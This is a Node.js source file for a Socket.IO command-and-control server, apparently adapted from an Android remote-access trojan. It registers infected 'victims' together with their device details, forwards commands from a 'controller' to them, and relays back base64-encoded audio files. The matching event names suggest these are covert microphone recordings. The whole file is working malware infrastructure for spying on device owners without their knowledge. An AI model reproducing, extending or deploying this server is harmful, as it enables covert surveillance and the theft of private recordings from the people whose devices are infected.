const express = require('express');
const http = require('https');
const socketIo = require('socket.io');

// A simplified version of the victimsList object from the Electron code.
const victimsList = {
    victims: {},
    addVictim(socket, ip, port, country, manufacturer, model, release, id, connectionUserId) {
        this.victims[id] = { socket, ip, port, country, manufacturer, model, release, id, connectionUserId };
        console.log(`Victim added: ${id}`);
    },
    getVictim(connectionUserId) {
        // Convert the object values to an array and find the victim by connectionUserId
        return Object.values(this.victims).find(victim => victim.connectionUserId === connectionUserId);
    },    
    rmVictim(id) {
        delete this.victims[id];
        console.log(`Victim removed: ${id}`);
    }
};

// Controllers list to track controller connections
const controllersList = {
    controllers: {},
    addController(socket, id, connectionUserId) {
        this.controllers[id] = { socket, id, connectionUserId };
        console.log(`Controller added: ${id}`);
    },
    getController(id) {
        return this.controllers[id];
    },
    rmController(id) {
        delete this.controllers[id];
        console.log(`Controller removed: ${id}`);
    }
};

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: '*', // Adjust to your needs
        methods: ['GET', 'POST']
    }
});

const PORT = 42474; // Change the port if needed

// Handle a new connection
io.on('connection', (socket) => {
    const address = socket.handshake.address;
    const query = socket.handshake.query;
    const index = query.id;
    const ip = address.split(':').pop(); // Extract IP address
    const country = null; // Modify as needed

    console.log(`Client connected: ${socket.id}, IP: ${ip}`);

    if (query.type !== 'controller') {
        // Victim-specific logic
        victimsList.addVictim(socket, ip, address, country, query.manf, query.model, query.release, query.id, query.connectionUserId);
        console.log(ip, address, country, query.manf, query.model, query.release, query.id, query.connectionUserId);

        // Notify the victim it has connected
        socket.emit('SocketIO:NewVictim', index);

       

        // Notify all clients of the new victim
        io.emit('SocketIO:NewVictim', index);
    } else {
        // Controller-specific logic
        controllersList.addController(socket, query.id);
        console.log(`Controller connected: ${query.id}`);

        socket.on('command', (data) => {
            console.log('Command received from controller:', data);
        
            // Here you can forward the command to the victim
            const victim = victimsList.getVictim(data.userId); // Ensure the controller specifies the victim
            if (victim) {
                victim.socket.emit('order', data.command); // Send command to victim
        
                // Listen for the result from the victim
                victim.socket.on('x0000mc', (resultData) => {
                    console.log('Result received from victim:', resultData);
                    
                    if (resultData.file && resultData.buffer) {
                        // Convert Buffer to base64
                        const base64Buffer = resultData.buffer.toString('base64');
                        
                        // Forward the result to the controller
                        const audioResponse = {
                            name: resultData.name,
                            buffer: base64Buffer,
                        };
                        
                        socket.emit('result', audioResponse);
                    } else {
                        console.error('Received data does not contain audio.');
                    }
                });
            } else {
                console.log(`Victim for Controller ID ${data.userId} not found.`);
            }
        });
        

        // Notify all clients of the new controller if needed
        io.emit('SocketIO:NewController', query.id);
    }

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);

        if (query.type === 'victim') {
            victimsList.rmVictim(index);
            io.emit('SocketIO:RemoveVictim', index); // Notify clients about the removal of the victim
        } else if (query.type === 'controller') {
            controllersList.rmController(query.id);
            io.emit('SocketIO:RemoveController', query.id); // Notify clients about the removal of the controller
        }
    });
});

// Error handling similar to the Electron `uncaughtException` handling
process.on('uncaughtException', (error) => {
    if (error.code === "EADDRINUSE") {
        console.log("Address already in use. Please change the port.");
    } else {
        console.error("Uncaught Exception:", error);
    }
});

// Start the server
server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
